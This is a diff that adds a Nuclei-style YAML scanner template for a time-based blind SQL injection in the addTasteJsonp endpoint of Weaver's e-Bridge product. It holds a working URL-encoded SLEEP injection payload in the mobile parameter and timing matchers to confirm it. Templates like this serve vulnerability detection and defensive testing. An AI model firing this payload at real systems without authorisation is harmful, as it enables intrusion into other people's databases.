@@ -1,0 +1,51 @@
+id: poc-yaml-weaver-e-bridge-addtastejsonp-sqli
+info:
+  name: 泛微云桥 e-Bridge addTasteJsonp接口SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(6,9)}}'
+  t2: '{{to_number(t1)+2}}'
+  t3: '{{rand_int(1,4)}}'
+  t4: '{{to_number(t3)+2}}'
+
+http:
+  - raw:
+      - |
+        GET /taste/addTasteJsonp?company=1&userName=1&jsonpcallback=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP({{t1}})))mKjk)%20OR%20%27KQZm%27=%27REcX HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "1({status:1})"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
+
+  - raw:
+      - |
+        GET /taste/addTasteJsonp?company=1&userName=1&jsonpcallback=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP({{t3}})))mKjk)%20OR%20%27KQZm%27=%27REcX HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "1({status:1})"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t3)"
+          - "duration < to_number(t4)"
